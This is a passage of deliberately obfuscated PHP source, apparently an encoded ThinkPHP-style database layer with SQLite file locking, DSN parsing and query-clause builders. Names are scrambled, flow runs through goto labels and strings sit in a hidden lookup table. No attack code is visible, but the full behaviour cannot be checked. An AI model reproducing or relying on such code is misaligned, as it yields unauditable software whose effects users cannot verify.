b½Œ‘†‹£; b óƒÜã³¶: foreach ($fâŒæö®Ô as $Dø©–…·Šï) { if (!isset($EôÁÏ²¿‘[$Dø©–…·Šï[$B„ã‰ÅÜôİ[180]]])) { continue; } $E‰›ÎÖ’Û = $EôÁÏ²¿‘[$Dø©–…·Šï[$B„ã‰ÅÜôİ[180]]]; foreach ($E‰›ÎÖ’Û as &$C‹íóùÆŠ) { $C‹íóùÆŠ[$B„ã‰ÅÜôİ[470]] = $Dø©–…·Šï[$B„ã‰ÅÜôİ[470]]; $C‹íóùÆŠ[$B„ã‰ÅÜôİ[603]] = !0; } unset($C‹íóùÆŠ); } $dÅÉÒÒè¬ = array(); foreach ($Eë¢ò¦¬‰¾ as $Cäè‘Ä¢…×) { if (isset($Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[603]]) && $Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[603]]) { continue; } $C‚²ôÆ´»Ì = $bàÍ‹˜†ù->getPathInner($Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[86]]); $e´®æ˜Îß = $dçó¯¹À»->addFileMake($C‚²ôÆ´»Ì, $Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[88]], $Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[181]], $Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[180]], $Cäè‘Ä¢…×[$B„ã‰ÅÜôİ[38]], $fÚ’Õéìî‘); $dÅÉÒÒè¬[] = $e´®æ˜Îß; } goto c¸Å¥¡«ä¦; f™êŠó¶Éë: foreach ($Eë¢ò¦¬‰¾ as &$C‹íóùÆŠ) { goto d›¾µËáù¾; d›¾µËáù¾: Hook::trigger($B„ã‰ÅÜôİ[604], $C‹íóùÆŠ); $C‹íóùÆŠ[$B„ã‰ÅÜôİ[86]] = $bàÍ‹˜†ù->getPathInner($C‹íóùÆŠ[$B„ã‰ÅÜôİ[86]]); $D‚È–ëë˜ = $bàÍ‹˜†ù->hashSimple($C‹íóùÆŠ[$B„ã‰ÅÜôİ[86]]); goto AğèŠ¯·…å; FÆ†ùŞ„Ã³: if (count($EôÁÏ²¿‘[$c£ÕÇ¸†òª]) > 1) { $C‹íóùÆŠ[$B„ã‰ÅÜôİ[603]] = !0; } goto Eñ¨ÄÏİ–„; f„—–âç¡Œ: $C‹íóùÆŠ[$B„ã‰ÅÜôİ[180]] = $c£ÕÇ¸†òª; Hook::trigger($B„ã‰ÅÜôİ[605], $C‹íóùÆŠ); $EôÁÏ²¿‘[$c£ÕÇ¸†òª][] =& $C‹íóùÆŠ; goto FÆ†ùŞ„Ã³; AğèŠ¯·…å: $c£ÕÇ¸†òª = $bàÍ‹˜†ù->hashMd5($C‹íóùÆŠ[$B„ã‰ÅÜôİ[86]]); if (strlen($c£ÕÇ¸†òª) > 10 && !isset($EôÁÏ²¿‘[$c£ÕÇ¸†òª])) { $EôÁÏ²¿‘[$c£ÕÇ¸†òª] = array(); } $C‹íóùÆŠ[$B„ã‰ÅÜôİ[181]] = $D‚È–ëë˜; goto f„—–âç¡Œ; Eñ¨ÄÏİ–„: } unset($C‹íóùÆŠ); $eñ´Àğ“™µ = array($B„ã‰ÅÜôİ[180] => array($B„ã‰ÅÜôİ[7], array_keys($EôÁÏ²¿‘))); goto e¼Ñ¸‡ÀÈ½; EôŞ¿Ş¼‹: } } define($_SERVER[œÕÊİğö][607], $_SERVER[œÕÊİğö][608]); $c¸š’›’» = $_SERVER[œÕÊİğö][609]; goto A±¡±ÊÁò; c¸Ø¢½ì¶: class DbSqlite3 extends DbSqlite3Base { public function query($Aá…·¿õ¶) { $f±È±ŒÈÍ =& $_SERVER[œÕÊİğö]; if (!CacheLock::fileLock($f±È±ŒÈÍ[19])) { return !1; } $fËÇ¯ÇŠÒÏ = parent::query($Aá…·¿õ¶); CacheLock::fileUnLock($f±È±ŒÈÍ[19]); return $fËÇ¯ÇŠÒÏ; } public function execute($c˜Ÿ«ŒÒŒ¶) { $D°º·ÚŞ‰· =& $_SERVER[œÕÊİğö]; if (!CacheLock::fileLock($D°º·ÚŞ‰·[19])) { return !1; } $CÜÈ¾µ• = parent::execute($c˜Ÿ«ŒÒŒ¶); CacheLock::fileUnLock($D°º·ÚŞ‰·[19]); return $CÜÈ¾µ•; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\x71" => "\x3c\76", "\147\164" => "\76", "\145\x67\164" => "\76\75", "\x6c\164" => "\74", "\x65\154\164" => "\x3c\75", "\x6e\157\x74\x6c\151\x6b\x65" => "\116\117\x54\x20\x4c\x49\x4b\105", "\x6c\151\153\x65" => "\x4c\111\113\x45", "\x69\x6e" => "\111\116", "\x6e\x6f\164\151\x6e" => "\116\x4f\x54\x20\x49\116", "\156\x6f\x74\x20\151\156" => "\116\117\124\40\111\x4e", "\142\x65\x74\x77\145\145\x6e" => "\102\105\x54\127\x45\105\116", "\156\x6f\164\142\x65\x74\167\145\145\x6e" => "\x4e\117\124\x20\102\105\x54\x57\105\x45\116", "\156\157\x74\x20\x62\145\x74\x77\x65\x65\x6e" => "\116\117\x54\40\x42\105\124\x57\105\105\x4e"); protected $selectSql = "\123\105\x4c\105\103\124\x25\104\x49\123\x54\x49\116\x43\124\45\40\45\x46\111\x45\x4c\x44\45\x20\x46\x52\117\x4d\x20\45\x54\101\102\x4c\105\x25\45\112\117\111\x4e\45\45\127\110\105\122\x45\x25\x25\x47\122\x4f\125\120\x25\x25\110\101\x56\x49\116\x47\45\x25\117\x52\x44\105\122\45\45\x4c\111\x4d\x49\x54\45\40\x25\125\116\111\x4f\116\45\x25\103\x4f\x4d\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $CÉ‹‹’¤ñÊ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[œÕÊİğö][943], $CÉ‹‹’¤ñÊ); } public function factory($A×–´¥à†Æ = '') { goto c±ÑÆ¸«äÒ; c±ÑÆ¸«äÒ: $EŸ”İÂñÔ =& $_SERVER[œÕÊİğö]; $A×–´¥à†Æ = $this->parseConfig($A×–´¥à†Æ); if (empty($A×–´¥à†Æ[$EŸ”İÂñÔ[944]])) { think_exception(think_lang($EŸ”İÂñÔ[945])); } goto fš­¥¾ê¢ø; Eùá²ÑƒÚ½: return $bñ³˜ìƒò; goto Dé£‹ââÒä; fš­¥¾ê¢ø: $this->dbType = ucwords(strtolower($A×–´¥à†Æ[$EŸ”İÂñÔ[944]])); $a¨„Ã»©ˆé = $EŸ”İÂñÔ[946] . $this->dbType; if (class_exists($a¨„Ã»©ˆé)) { $bñ³˜ìƒò = new $a¨„Ã»©ˆé($A×–´¥à†Æ); if ($EŸ”İÂñÔ[787] != strtolower($A×–´¥à†Æ[$EŸ”İÂñÔ[944]])) { $bñ³˜ìƒò->dbType = strtoupper($this->dbType); } else { $bñ³˜ìƒò->dbType = $this->_getDsnType($A×–´¥à†Æ[$EŸ”İÂñÔ[899]]); } } else { think_exception(think_lang($EŸ”İÂñÔ[947]) . $EŸ”İÂñÔ[948] . $a¨„Ã»©ˆé); } goto Eùá²ÑƒÚ½; Dé£‹ââÒä: } public function __call($BŠ£Æƒá“ˆ, $c–ÖšÑÈ¾â) { if (method_exists($this, $BŠ£Æƒá“ˆ)) { return call_user_func_array(array($this, $BŠ£Æƒá“ˆ), $c–ÖšÑÈ¾â); } } protected function _getDsnType($c·•èšôÒ÷) { $B—„¥˜ˆ“ = explode($_SERVER[œÕÊİğö][4], $c·•èšôÒ÷); $DÕÒˆ´ËÎ’ = strtoupper(trim($B—„¥˜ˆ“[0])); return $DÕÒˆ´ËÎ’; } private function parseConfig($c½¸ ¹Ğ«‡ = '') { $c¡š·‹Íê  =& $_SERVER[œÕÊİğö]; if (!empty($c½¸ ¹Ğ«‡) && is_string($c½¸ ¹Ğ«‡)) { $c½¸ ¹Ğ«‡ = $this->parseDSN($c½¸ ¹Ğ«‡); } elseif (is_array($c½¸ ¹Ğ«‡)) { $c½¸ ¹Ğ«‡ = array_change_key_case($c½¸ ¹Ğ«‡); $c½¸ ¹Ğ«‡ = array($c¡š·‹Íê [944] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [786]], $c¡š·‹Íê [872] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [949]], $c¡š·‹Íê [873] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [950]], $c¡š·‹Íê [870] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [951]], $c¡š·‹Íê [871] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [952]], $c¡š·‹Íê [27] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [953]], $c¡š·‹Íê [899] => $c½¸ ¹Ğ«‡[$c¡š·‹Íê [788]], $c¡š·‹Íê [23] => isset($c½¸ ¹Ğ«‡[$c¡š·‹Íê [954]]) ? $c½¸ ¹Ğ«‡[$c¡š·‹Íê [954]] : array()); } elseif (empty($c½¸ ¹Ğ«‡)) { if (think_config($c¡š·‹Íê [955]) && $c¡š·‹Íê [787] != strtolower(think_config($c¡š·‹Íê [956]))) { $c½¸ ¹Ğ«‡ = $this->parseDSN(think_config($c¡š·‹Íê [955])); } else { $c½¸ ¹Ğ«‡ = array($c¡š·‹Íê [944] => think_config($c¡š·‹Íê [956]), $c¡š·‹Íê [872] => think_config($c¡š·‹Íê [957]), $c¡š·‹Íê [873] => think_config($c¡š·‹Íê [958]), $c¡š·‹Íê [870] => think_config($c¡š·‹Íê [959]), $c¡š·‹Íê [871] => think_config($c¡š·‹Íê [960]), $c¡š·‹Íê [27] => think_config($c¡š·‹Íê [254]), $c¡š·‹Íê [899] => think_config($c¡š·‹Íê [955]), $c¡š·‹Íê [23] => think_config($c¡š·‹Íê [961])); } } return $c½¸ ¹Ğ«‡; } protected function initConnect($CØìŞ»Î©ë = true) { if (1 == think_config($_SERVER[œÕÊİğö][28])) { $this->_linkID = $this->multiConnect($CØìŞ»Î©ë); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $bæÒ„ÅìÚ => $fÕÑã×½øŞ) { $this->_linkID = $fÕÑã×½øŞ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($cÊŸĞÆÆè• = false) { goto f„Ï¿ÜêÁ; e£éŞ‹µïÓ: $cç³ò­È„… = array($cÛÊº¸ËÏ£[872] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[872]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[872]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[872]][0], $cÛÊº¸ËÏ£[873] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[873]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[873]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[873]][0], $cÛÊº¸ËÏ£[870] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[870]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[870]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[870]][0], $cÛÊº¸ËÏ£[871] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[871]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[871]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[871]][0], $cÛÊº¸ËÏ£[27] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[27]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[27]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[27]][0], $cÛÊº¸ËÏ£[899] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[899]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[899]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[899]][0], $cÛÊº¸ËÏ£[23] => isset($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[23]][$B’Ã¶µÓ¾]) ? $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[23]][$B’Ã¶µÓ¾] : $BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[23]][0]); return $this->connect($cç³ò­È„…, $B’Ã¶µÓ¾); goto E†ùíÖš®â; f´‘Ô¼»ƒô: if (empty($BÍ‰Ü•çÙĞ)) { foreach ($this->config as $DÚº†·¯ø§ => $A¼´´É‰¨½) { $BÍ‰Ü•çÙĞ[$DÚº†·¯ø§] = explode($cÛÊº¸ËÏ£[57], $A¼´´É‰¨½); } } if (think_config($cÛÊº¸ËÏ£[962])) { if ($cÊŸĞÆÆè• || think_config($cÛÊº¸ËÏ£[400]) === !0) { $B’Ã¶µÓ¾ = floor(mt_rand(0, think_config($cÛÊº¸ËÏ£[963]) - 1)); $d¡£â«óì = $B’Ã¶µÓ¾; } else { if (is_numeric(think_config($cÛÊº¸ËÏ£[964]))) { $B’Ã¶µÓ¾ = think_config($cÛÊº¸ËÏ£[964]); } else { $B’Ã¶µÓ¾ = floor(mt_rand(think_config($cÛÊº¸ËÏ£[963]), count($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[870]]) - 1)); } } } else { $B’Ã¶µÓ¾ = floor(mt_rand(0, count($BÍ‰Ü•çÙĞ[$cÛÊº¸ËÏ£[870]]) - 1)); $d¡£â«óì = $B’Ã¶µÓ¾; } $B’Ã¶µÓ¾ = $d¡£â«óì !== -1 ? $d¡£â«óì : $B’Ã¶µÓ¾; goto e£éŞ‹µïÓ; f„Ï¿ÜêÁ: $cÛÊº¸ËÏ£ =& $_SERVER[œÕÊİğö]; static $BÍ‰Ü•çÙĞ = array(); static $d¡£â«óì = -1; goto f´‘Ô¼»ƒô; E†ùíÖš®â: } public function parseDSN($AÛí‹ÉÑÁÒ) { $b¡êÁƒØóâ =& $_SERVER[œÕÊİğö]; if (empty($AÛí‹ÉÑÁÒ)) { return !1; } $aÅÕØÈŒ†¶ = parse_url($AÛí‹ÉÑÁÒ); if ($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[184]]) { $AÆ‰…È×Ë… = array($b¡êÁƒØóâ[944] => $aÅÕØÈŒ†¶[$b¡êÁƒØóâ[184]], $b¡êÁƒØóâ[872] => isset($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[597]]) ? $aÅÕØÈŒ†¶[$b¡êÁƒØóâ[597]] : $b¡êÁƒØóâ[43], $b¡êÁƒØóâ[873] => isset($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[965]]) ? $aÅÕØÈŒ†¶[$b¡êÁƒØóâ[965]] : $b¡êÁƒØóâ[43], $b¡êÁƒØóâ[870] => isset($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[185]]) ? $aÅÕØÈŒ†¶[$b¡êÁƒØóâ[185]] : $b¡êÁƒØóâ[43], $b¡êÁƒØóâ[871] => isset($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[186]]) ? $aÅÕØÈŒ†¶[$b¡êÁƒØóâ[186]] : $b¡êÁƒØóâ[43], $b¡êÁƒØóâ[27] => isset($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[86]]) ? substr($aÅÕØÈŒ†¶[$b¡êÁƒØóâ[86]], 1) : $b¡êÁƒØóâ[43]); } else { preg_match($b¡êÁƒØóâ[966], trim($AÛí‹ÉÑÁÒ), $f§ãÚ‰«©); $AÆ‰…È×Ë… = array($b¡êÁƒØóâ[944] => $f§ãÚ‰«©[1], $b¡êÁƒØóâ[872] => $f§ãÚ‰«©[2], $b¡êÁƒØóâ[873] => $f§ãÚ‰«©[3], $b¡êÁƒØóâ[870] => $f§ãÚ‰«©[4], $b¡êÁƒØóâ[871] => $f§ãÚ‰«©[5], $b¡êÁƒØóâ[27] => $f§ãÚ‰«©[6]); } $AÆ‰…È×Ë…[$b¡êÁƒØóâ[899]] = $b¡êÁƒØóâ[43]; return $AÆ‰…È×Ë…; } protected function debug() { $bÑ­³½ÂÜ­ =& $_SERVER[œÕÊİğö]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bÑ­³½ÂÜ­[967]; if (think_config($bÑ­³½ÂÜ­[968])) { think_status($bÑ­³½ÂÜ­[969]); think_trace($this->queryStr . $bÑ­³½ÂÜ­[970] . think_status($bÑ­³½ÂÜ­[30], $bÑ­³½ÂÜ­[969], 6) . $bÑ­³½ÂÜ­[971], $bÑ­³½ÂÜ­[43], $bÑ­³½ÂÜ­[972]); } } protected function parseLock($b¢ë×òÓÓ = false) { $b÷«–‚ùœÃ =& $_SERVER[œÕÊİğö]; if (!$b¢ë×òÓÓ) { return $b÷«–‚ùœÃ[43]; } if ($b÷«–‚ùœÃ[901] == $this->dbType) { return $b÷«–‚ùœÃ[973]; } return $b÷«–‚ùœÃ[974]; } protected function parseSet($cÅµì©ëÒâ) { $fŸƒ‚İÎ  =& $_SERVER[œÕÊİğö]; foreach ($cÅµì©ëÒâ as $dŞ›¸Ò˜‹ö => $cà˜ÕîƒÇ) { if (is_array($cà˜ÕîƒÇ) && $fŸƒ‚İÎ [305] == $cà˜ÕîƒÇ[0]) { $Cì¼’‡Ì[] = $this->parseKey($dŞ›¸Ò˜‹ö) . $fŸƒ‚İÎ [975] . $cà˜ÕîƒÇ[1]; } elseif (is_scalar($cà˜ÕîƒÇ) || is_null($cà˜ÕîƒÇ)) { $Cì¼’‡Ì[] = $this->parseKey($dŞ›¸Ò˜‹ö) . $fŸƒ‚İÎ [975] . $this->parseValue($cà˜ÕîƒÇ); } } return $fŸƒ‚İÎ [976] . implode($fŸƒ‚İÎ [57], $Cì¼’‡Ì); } protected function bindParam($a§ºÚï×¯, $d‰çà’Ùµ) { $this->bind[$_SERVER[œÕÊİğö][4] . $a§ºÚï×¯] = $d‰çà’Ùµ; } protected function parseBind($f±ìâÌ–ÍÕ) { $f±ìâÌ–ÍÕ = array_merge($this->bind, $f±ìâÌ–ÍÕ); $this->bind = array(); return $f±ìâÌ–ÍÕ; } function parseKey(&$d‘Õ…Ã–²¼, $bÛä–ßÃ­ = true) { if ($bÛä–ßÃ­) { $d‘Õ…Ã–²¼ = $this->parseKeyCheck($d‘Õ…Ã–²¼); } return $d‘Õ…Ã–²¼; } function parseKeyCheck($f¼ö ëÑö‡) { $Dˆ•Ò÷‘î— =& $_SERVER[œÕÊİğö]; $f¼ö ëÑö‡ = trim($f¼ö ëÑö‡); if (!preg_match($Dˆ•Ò÷‘î—[977], $f¼ö ëÑö‡)) { think_exception($Dˆ•Ò÷‘î—[978] . $f¼ö ëÑö‡); } return $f¼ö ëÑö‡; } protected function parseValue($b•ë‹êç¾İ) { $aß¼³Í¤¿Ö =& $_SERVER[œÕÊİğö]; if (is_string($b•ë‹êç¾İ)) { $b•ë‹êç¾İ = $aß¼³Í¤¿Ö[940] . $this->escapeString($b•ë‹êç¾İ) . $aß¼³Í¤¿Ö[940]; } elseif (isset($b•ë‹êç¾İ[0]) && is_string($b•ë‹êç¾İ[0]) && strtolower($b•ë‹êç¾İ[0]) == $aß¼³Í¤¿Ö[305]) { $b•ë‹êç¾İ = $this->escapeString($b•ë‹êç¾İ[1]); } elseif (is_array($b•ë‹êç¾İ)) { $b•ë‹êç¾İ = array_map(array($this, $aß¼³Í¤¿Ö[941]), $b•ë‹êç¾İ); } elseif (is_bool($b•ë‹êç¾İ)) { $b•ë‹êç¾İ = $b•ë‹êç¾İ ? $aß¼³Í¤¿Ö[97] : $aß¼³Í¤¿Ö[201]; } elseif (is_null($b•ë‹êç¾İ)) { $b•ë‹êç¾İ = $aß¼³Í¤¿Ö[113]; } return $b•ë‹êç¾İ; } protected function parseField($BŠ¸Œ¾¡ù¨) { $cåËÃõŞéÕ =& $_SERVER[œÕÊİğö]; if (is_string($BŠ¸Œ¾¡ù¨) && strpos($BŠ¸Œ¾¡ù¨, $cåËÃõŞéÕ[57])) { $BŠ¸Œ¾¡ù¨ = explode($cåËÃõŞéÕ[57], $BŠ¸Œ¾¡ù¨); } if (is_array($BŠ¸Œ¾¡ù¨)) { $B¹ª“ƒõ è = array(); foreach ($BŠ¸Œ¾¡ù¨ as $bÓ·êØ’™ => $aÜğ…¤ë±Š) { if (!is_numeric($bÓ·êØ’™)) { $B¹ª“ƒõ è[] = $this->parseKey($bÓ·êØ’™, !1) . $cåËÃõŞéÕ[979] . $this->parseKey($aÜğ…¤ë±Š); } else { $B¹ª“ƒõ è[] = $this->parseKey($aÜğ…¤ë±Š); } } $C­æ‡µÏö– = implode($cåËÃõŞéÕ[57], $B¹ª“ƒõ è); } elseif (is_string($BŠ¸Œ¾¡ù¨) && !empty($BŠ¸Œ¾¡ù¨)) { $C­æ‡µÏö– = $BŠ¸Œ¾¡ù¨; } else { $C­æ‡µÏö– = $cåËÃõŞéÕ[192]; } return $C­æ‡µÏö–; } protected function parseTable($E‡‰ÃƒËÇ–) { $cçŸÀ·ÖÎô =& $_SERVER[œÕÊİğö]; if (is_array($E‡‰ÃƒËÇ–)) { $F¬ô£áÎé = array(); foreach ($E‡‰ÃƒËÇ– as $DÁ¢ºˆÛŒ => $e›ÒÎñ‘Š) { if (!is_numeric($DÁ¢ºˆÛŒ)) { $F¬ô£áÎé[] = $this->parseKey($DÁ¢ºˆÛŒ) . $cçŸÀ·ÖÎô[60] . $this->parseKey($e›ÒÎñ‘Š); } else { $F¬ô£áÎé[] = $this->parseKey($DÁ¢ºˆÛŒ); } } $E‡‰ÃƒËÇ– = $F¬ô£áÎé; } elseif (is_string($E‡‰ÃƒËÇ–)) { if (strstr($E‡‰ÃƒËÇ–, $cçŸÀ·ÖÎô[60])) { return $E‡‰ÃƒËÇ–; } $E‡‰ÃƒËÇ– = explode($cçŸÀ·ÖÎô[57], $E‡‰ÃƒËÇ–); array_walk($E‡‰ÃƒËÇ–, array($this, $cçŸÀ·ÖÎô[890])); } return $cçŸÀ·ÖÎô[884] . trim(implode($cçŸÀ·ÖÎô[980], $E‡‰ÃƒËÇ–), $cçŸÀ·ÖÎô[392]) . $cçŸÀ·ÖÎô[884]; } protected function parseWhere($c¡ŠóëªĞÚ) { $B‰ª•·Ÿ½¾ =& $_SERVER[œÕÊİğö]; $D„½ç÷÷ = $B‰ª•·Ÿ½¾[43]; if (is_string($c¡ŠóëªĞÚ)) { $D„½ç÷÷ = $c¡ŠóëªĞÚ; } else { $a¼êãˆ ¥ = isset($c¡ŠóëªĞÚ[$B‰ª•·Ÿ½¾[981]]) ? strtoupper($c¡ŠóëªĞÚ[$B‰ª•·Ÿ½¾[981]]) : $B‰ª•·Ÿ½¾[43]; if (in_array($a¼êãˆ ¥, array($B‰ª•·Ÿ½¾[982], $B‰ª•·Ÿ½¾[983], $B‰ª•·Ÿ½¾[984]))) { $a¼êãˆ ¥ = $B‰ª•·Ÿ½¾[60] . $a¼êãˆ ¥ . $B‰ª•·Ÿ½¾[60]; unset($c¡ŠóëªĞÚ[$B‰ª•·Ÿ½¾[981]]); } else { $a¼êãˆ ¥ = $B‰ª•·Ÿ½¾[985]; } foreach ($c¡ŠóëªĞÚ as $fö„¯õÉÂ => $AÓ¥ì§ÍÓ) { $D„½ç÷÷ .= $B‰ª•·Ÿ½¾[285]; if (is_numeric($fö„¯õÉÂ)) { $fö„¯õÉÂ = $B‰ª•·Ÿ½¾[986]; } if (0 === strpos($fö„¯õÉÂ, $B‰ª•·Ÿ½¾[81])) { $D„½ç÷÷ .= $this->parseThinkWhere($fö„¯õÉÂ, $AÓ¥ì§ÍÓ); } else { if (!preg_match($B‰ª•·Ÿ½¾[987], trim($fö„¯õÉÂ))) { think_exception(think_lang($B‰ª•·Ÿ½¾[988]) . $B‰ª•·Ÿ½¾[4] . $fö„¯õÉÂ); } $E†‡Û•·Õ = is_array($AÓ¥ì§ÍÓ) && isset($AÓ¥ì§ÍÓ[$B‰ª•·Ÿ½¾[989]]); $fö„¯õÉÂ = trim($fö„¯õÉÂ); if (strpos($fö„¯õÉÂ, $B‰ª•·Ÿ½¾[291])) { $C¡òß©¦×‡ = explode($B‰ª•·Ÿ½¾[291], $fö„¯õÉÂ); $FõàÎä¤ö = array(); foreach ($C¡òß©¦×‡ as $cÍ‹ËÒ—á˜ => $cÛ²åÜÌÙ) { $f¾ñù–§— = $E†‡Û•·Õ ? $AÓ¥ì§ÍÓ[$cÍ‹ËÒ—á˜] : $AÓ¥ì§ÍÓ; $FõàÎä¤ö[] = $B‰ª•·Ÿ½¾[268] . $this->parseWhereItem($this->parseKey($cÛ²åÜÌÙ), $f¾ñù–§—) . $B‰ª•·Ÿ½¾[889]; } $D„½ç÷÷ .= implode($B‰ª•·Ÿ½¾[990], $FõàÎä¤ö); } elseif (strpos($fö„¯õÉÂ, $B‰ª•·Ÿ½¾[292])) { $C¡òß©¦×‡ = explode($B‰ª•·Ÿ½¾[292], $fö„¯õÉÂ); $FõàÎä¤ö = array(); foreach ($C¡òß©¦×‡ as $cÍ‹ËÒ—á˜ => $cÛ²åÜÌÙ) { $f¾ñù–§— = $E†‡Û•·Õ ? $AÓ¥ì§ÍÓ[$cÍ‹ËÒ—á˜] : $AÓ¥ì§ÍÓ; $FõàÎä¤ö[] = $B‰ª•·Ÿ½¾[268] . $this->parseWhereItem($this->parseKey($cÛ²åÜÌÙ), $f¾ñù–§—) . $B‰ª•·Ÿ½¾[889]; } $D„½ç÷÷ .= implode($B‰ª•·Ÿ½¾[985], $FõàÎä¤ö); } else { $D„½ç÷÷ .= $this->parseWhereItem($this->parseKey($fö„¯õÉÂ), $AÓ¥ì§ÍÓ); } } $D„½ç÷÷ .= $B‰ª•·Ÿ½¾[286] . $a¼êãˆ ¥; } $D„½ç÷÷ = substr($D„½ç÷÷, 0, -strlen($a¼êãˆ ¥)); } return empty($D„½ç÷÷) ? $B‰ª•·Ÿ½¾[43] : $B‰ª•·Ÿ½¾[991] . $D„½ç÷÷; } protected function parseWhereItem($bº¢‹ç£™Ò, $cÇš‚í›ôß) { $E·Š÷¯†Ãì =& $_SERVER[œÕÊİğö]; $a´ì®¯«î¨ = $E·Š÷¯†Ãì[43]; if (is_array($cÇš‚í›ôß)) { if (is_string($cÇš‚í›ôß[0])) { $c˜óŞèÚ = strtolower($cÇš‚í›ôß[0]); if (in_array($cÇš‚í›ôß[0], array($E·Š÷¯†Ãì[975], $E·Š÷¯†Ãì[992], $E·Š÷¯†Ãì[993], $E·Š÷¯†Ãì[994], $E·Š÷¯†Ãì[995], $E·Š÷¯†Ãì[996]))) { $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $cÇš‚í›ôß[0] . $E·Š÷¯†Ãì[60] . $this->parseValue($cÇš‚í›ôß[1]); } elseif (preg_match($E·Š÷¯†Ãì[997], $cÇš‚í›ôß[0])) { $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[60] . $this->parseValue($cÇš‚í›ôß[1]); } elseif (preg_match($E·Š÷¯†Ãì[998], $cÇš‚í›ôß[0])) { if (is_array($cÇš‚í›ôß[1])) { $f‰“Ì¦–ƒ¡ = isset($cÇš‚í›ôß[2]) ? strtoupper($cÇš‚í›ôß[2]) : $E·Š÷¯†Ãì[983]; if (in_array($f‰“Ì¦–ƒ¡, array($E·Š÷¯†Ãì[982], $E·Š÷¯†Ãì[983], $E·Š÷¯†Ãì[984]))) { $C‹ãœäå÷ô = array(); foreach ($cÇš‚í›ôß[1] as $bè ¶ğ»à¸) { $C‹ãœäå÷ô[] = $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[60] . $this->parseValue($bè ¶ğ»à¸); } $a´ì®¯«î¨ .= $E·Š÷¯†Ãì[268] . implode($E·Š÷¯†Ãì[60] . $f‰“Ì¦–ƒ¡ . $E·Š÷¯†Ãì[60], $C‹ãœäå÷ô) . $E·Š÷¯†Ãì[889]; } } else { $a´ì®¯«î¨ .= $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $this->exp[$c˜óŞèÚ] . $E·Š÷¯†Ãì[60] . $this->parseValue($cÇš‚í›ôß[1]); } } elseif ($E·Š÷¯†Ãì[305] == $c˜óŞèÚ) { $a´ì®¯«î¨ .= $E·Š÷¯†Ãì[887] . $bº¢‹ç£™Ò . $E·Š÷¯†Ãì[60] . $cÇš‚í›ôß[1] . $E·Š÷¯†Ãì[999]; } elseif (preg_match($E·Š÷¯†Ãì[1000], $cÇš‚í›ôß[0])) { $a´ì®¯«î¨ .= $cÇš‚í›ôß[0]; } elseif (preg_match($E·Š÷¯†Ãì[1001], $cÇš‚í›ôß[0])) { if (isset($cÇš‚í›ôß[2]) && $E·Š÷¯†Ãì[305] == 